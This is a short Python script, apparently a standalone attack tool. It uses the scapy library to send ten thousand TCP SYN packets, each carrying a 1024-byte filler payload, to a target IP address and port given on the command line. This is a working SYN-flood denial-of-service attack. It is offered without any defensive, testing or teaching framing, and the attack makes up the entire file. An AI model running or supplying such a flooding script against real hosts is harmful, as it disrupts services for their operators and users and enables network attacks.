from scapy.all import *
import sys

def main(target_ip, target_port, rounds=10_000):
    print(f"Target IP: {target_ip}")
    print(f"Target Port: {target_port}")
    print(f"Rounds: {rounds}")

    # Define the payload to send in the packets
    payload = "A" * 1024

    # Create a loop to send a large number of packets to the target
    for i in range(rounds):
        packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S") / payload
        send(packet, verbose=False)

if __name__ == "__main__":
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    main(target_ip=target_ip, target_port=target_port)
